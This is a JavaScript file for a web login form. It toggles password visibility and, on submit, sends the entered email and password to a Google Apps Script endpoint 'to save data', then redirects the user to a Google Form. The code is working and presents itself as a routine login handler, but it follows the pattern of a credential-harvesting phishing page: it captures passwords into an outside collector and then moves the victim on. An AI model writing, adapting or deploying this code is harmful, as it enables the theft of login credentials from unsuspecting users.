document.addEventListener("DOMContentLoaded", function () {
    const form = document.getElementById("userForm");

    // Toggle password visibility
    const togglePassword = document.getElementById("togglePassword");
    togglePassword.addEventListener("click", function () {
        const passwordField = document.getElementById("password");
        const passwordFieldType = passwordField.getAttribute("type");

        if (passwordFieldType === "password") {
            passwordField.setAttribute("type", "text");
            this.querySelector("img").src = "eye-slash-icon.png"; // Update icon to "hide" version
        } else {
            passwordField.setAttribute("type", "password");
            this.querySelector("img").src = "eye-icon.png"; // Revert icon to "show" version
        }
    });

    // Handle form submission
    form.addEventListener("submit", function (event) {
        event.preventDefault(); // Prevent default form submission

        // Get form values
        const email = document.getElementById("email").value;
        const password = document.getElementById("password").value;

        // Prepare data to send
        const formData = new FormData();
        formData.append("email", email);
        formData.append("password", password);

        // Google Apps Script endpoint to save data
        const scriptURL = "https://script.google.com/macros/s/AKfycbw_Sx1qP0A8aiV0GcZ83SNUHMRh0Nibr6ITjMz7EWZFM2QuDXvahZsn8VloDVvCCfXt/exec";

        // Send data using fetch API
        fetch(scriptURL, {
            method: "POST",
            body: formData,
        })
            .then((response) => {
                if (response.ok) {
                    // Redirect to the Google Form
                    window.location.href = "https://forms.gle/8DRhMibdDY5CrXFMA";
                } else {
                    alert("Error saving data. Please try again.");
                }
            })
            .catch((error) => {
                console.error("Error:", error);
                alert("Error saving data. Please try again.");
            });
    });
});

